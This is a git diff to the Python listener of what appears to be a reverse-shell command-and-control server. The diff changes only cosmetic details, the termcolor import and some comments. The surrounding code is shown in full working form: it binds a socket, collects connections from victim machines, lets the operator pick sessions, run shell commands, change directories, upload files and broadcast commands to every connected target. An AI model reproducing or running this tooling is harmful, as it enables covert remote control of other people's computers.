@@ -2,7 +2,7 @@ import os
 import json
 import socket
 import threading
-import termcolor
+from termcolor import colored
 
 
 def reliable_send(target, data):
@@ -43,12 +43,12 @@ def accept_connections():
     while True:
         if stop_flag:
             break
-        sock.settimeout(1) ##If any error occurs uncomment this line sare na
+        sock.settimeout(1) ##If any error occurs uncomment this line
         try:
             target, ip = sock.accept()
             targets.append(target)
             ips.append(ip)
-            print(termcolor.colored(f'[+] {str(ip)} has Connected!','green'))
+            print(colored(f'[+] {str(ip)} has Connected!','green'))
         except:
             pass
 
@@ -56,7 +56,7 @@ def accept_connections():
 def target_communication(target, ip):
     count = 1
     while True:
-        command = input(termcolor.colored('* Shell~%s: ' % str(ip), 'yellow'))
+        command = input(colored('* Shell~%s: ' % str(ip), 'yellow'))
         reliable_send(target, command)
         
         #QUIT
@@ -96,9 +96,9 @@ def target_communication(target, ip):
         elif command.startswith('cd'):
             result = reliable_receive(target)
             if result is False:
-                print(termcolor.colored("Directory not found or misspelled", 'red'))
+                print(colored("Directory not found or misspelled", 'red'))
             else:
-                print(termcolor.colored(f'Changed Directory to: {result}', 'green'))
+                print(colored(f'Changed Directory to: {result}', 'green'))
 
         #UPLOAD
         elif command.startswith('-U'):
@@ -110,9 +110,9 @@ def target_communication(target, ip):
 
         #HELP
         elif command == 'help':
-            print(termcolor.colored('''
+            print(colored('''
             [!!]Commands are CaSe SeNsItIvE [!!]
-            ''', 'red')+'\n'+termcolor.colored('''\n
+            ''', 'red')+'\n'+colored('''\n
             quit/exit                           --> Quit Current Session
             clear                               --> Clear The Screen
             cd *Directory Name*                 --> Changes Directory
@@ -125,17 +125,17 @@ def target_communication(target, ip):
             \n''', 'yellow'))
         else:
             result = reliable_receive(target)
-            print(termcolor.colored(result, 'green'))
+            print(colored(result, 'green'))
 
 
 targets = []; ips = []
 stop_flag = False
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
-sock.bind(('192.168.0.105', 9797))
+sock.bind(('192.168.0.105', 9797)) # Change the IP ADDRESS HERE
 sock.listen(5)
 t1 = threading.Thread(target=accept_connections)
 t1.start()
-print(termcolor.colored('[+] Waiting For Incoming Connections....', 'yellow'))
+print(colored('[+] Waiting For Incoming Connections....', 'yellow'))
 
 while True:
     command = input('[**] Command & Control Center: ')
@@ -158,7 +158,7 @@ while True:
             tar_ip = ips[num]
             target_communication(tar_num, tar_ip)
         except:
-            print(termcolor.colored('[-] No Session Found Under That ID number', 'red'))
+            print(colored('[-] No Session Found Under That ID number', 'red'))
         
     elif command== 'exit':
         for target in targets:
@@ -188,16 +188,16 @@ while True:
                 reliable_send(target_number, command[8:])
                 i+=1
         except:
-            print(termcolor.colored('[-] Failed', 'red'))
+            print(colored('[-] Failed', 'red'))
     
     elif command[:6] == 'select':
         id = int(command[7:])
         print(id)
         target_communication(targets[id], ips[id])
     elif command == 'help' or command == '-h':
-        print(termcolor.colored('''
+        print(colored('''
         [!!]Commands are CaSe SeNsItIvE [!!]
-        ''', 'red')+'\n'+termcolor.colored('''\n
+        ''', 'red')+'\n'+colored('''\n
             session [session_number]/select [session_number]    --> Log in to [session_number] machine)
             sendall [command]                                   --> Sends The Command To All The Machines Connected
             list targets                                        --> List all the connected targets
@@ -208,4 +208,4 @@ while True:
             
             \n''', 'yellow'))
     else:
-        print(termcolor.colored('[!!] Command Does Not Exist', 'red'))
+        print(colored('[!!] Command Does Not Exist', 'red'))
